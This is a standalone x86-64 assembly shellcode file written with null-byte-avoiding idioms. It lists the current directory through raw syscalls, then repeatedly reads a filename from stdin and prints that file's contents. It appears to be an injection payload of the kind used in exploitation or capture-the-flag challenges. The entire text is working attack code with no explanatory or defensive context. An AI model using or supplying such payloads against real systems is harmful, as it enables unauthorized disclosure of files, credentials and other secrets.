BITS 64
global _start
_start:
    jmp loadstring
dir_read:
    pop rdi
    xor rax,rax
    push rax
    pop rsi
    push rax
    pop rdx
    mov al,0x2
    syscall
getdents:
    mov dl,0x7f
    mov rsi,rsp ; linux_dirent
    mov rdi,rax ; fd
    mov al,0x4e
    syscall
    cmp rax,1
    jl file_read
    mov r10,rsp
    lea r8,[rax+r10]  ; nread
next_ent:
    lea rsi,[r10+0x12] ; d_name
write:
    xor rdx,rdx
    mov dl,0x1  ; count
    mov dil,0x1 ; fd
    xor rax,rax
    mov al,0x1
    syscall
    inc rsi
    mov al,byte [rsi]
    test al,al
    jnz write

    lea rsi,[rdx+0x9] ; '\n'
    push rsi
    mov rsi,rsp
    mov al,0x1
    syscall
    add rsp, 8

    xor rsi,rsi
    mov si,word [r10+0x10] ; d_reclen
    add r10,rsi
    cmp r10,r8
    jl next_ent
    jmp getdents
loadstring:
    call dir_read
    db ".",0
file_read:
    xor rax,rax
    push rax
    pop rdi
    push rsp
    pop rsi
    push rax
    pop rdx
    mov dl,0xff
    syscall
    mov byte [rsp+rax-1],0x0

    xor rax,rax
    push rsp
    pop rdi
    push rax
    pop rsi
    mov dl,0xff
    mov al,0x2
    syscall

    push rax
    pop rdi
    push rsi
    pop rax
    push rsp
    pop rsi
    mov dl,0xff
    syscall

    xchg rax,rdx
    mov dil,0x1
    mov al,0x1
    syscall
    jmp file_read
